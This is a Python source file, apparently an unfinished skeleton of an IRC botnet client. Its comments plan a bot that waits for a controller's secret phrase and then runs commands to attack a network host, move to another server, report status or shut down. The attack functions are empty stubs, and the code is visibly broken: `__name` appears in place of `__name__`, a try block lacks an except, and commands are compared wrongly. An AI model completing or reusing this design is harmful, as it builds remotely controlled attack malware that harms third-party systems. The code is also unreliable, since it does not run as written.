import time
import socket
import sys
import random 

HOST = None
PORT = None 
CHANNEL = None 
PHRASE = None 
IRC = None
CONTROLLER_FLAG = True 

# BOT TODO
# Listen on channel and detect secret phrase from controller
# Execute commands sent by controller to channel
# Commands: Network attack, migration to different IRC, ShutDown
# Report status of command execution to controller

def getStatus():    
    return

def attack():
    pass

def move():
    pass 

def quit():
    pass 

def shutdown():
    pass


# GET COMMANDS FROM CONTROLLER
def getCommand(conSocket):
    msg = conSocket.recv(1024).decode('utf-8', 'ignore').strip()
    return 

# DO COMMANDS
def commandHandler():

    # Get Commands
    # status, attack <host><port>, move<host><port><channel>, quit, shutdown
    command = getCommand(conSocket)
    command = command.split()

    if command == "status":
        print("Command: status")
        status = getStatus()
        print(str(status))
    elif command == "attack":
        try:
            host = command[1]
            port = command[2]
            print("Command: attack " + str(host) + " " + str(port))
            attack(host, port)
        except:
            pass
    elif command == "move":
        try:
            host = command[1]
            port = command[2]
            channel = command[3]
            move(host, port, channel)
            print("Command: move " + str(host) + " " + str(port) + " " + str(channel))
    elif command == "quit":
        quit()
    elif command == "shutdown":
        shutdown()



# CONNECT TO IRC SERVER CHANNEL
# This next line goes to a function
# ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def serverConnect(ircSocket, host, port):
    try:
        ircSocket.connect((host,port))
        print("Connection successful")
        return True
    except:
        print("Connection failed")
        return False 




if __name == "__main__":

    # Get sys.args
    if len(sys.argv) != 4:
        print("Wrong number of inputs")
        sys.exit()

    HOST = sys.argv[0]
    PORT = sys.argv[1]
    CHANNEL = sys.argv[2]
    PHRASE = sys.argv[3]

    if not PORT.isdigit():
        print("Invalid port")
        sys.exit()

    # Keep Connection to IRC Server
    while True:
        ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Do connection stuff
        connectionFlag = serverConnect(ircSocket, HOST, PORT)
        while connectionFlag:
            commandHandler()
            
        

        


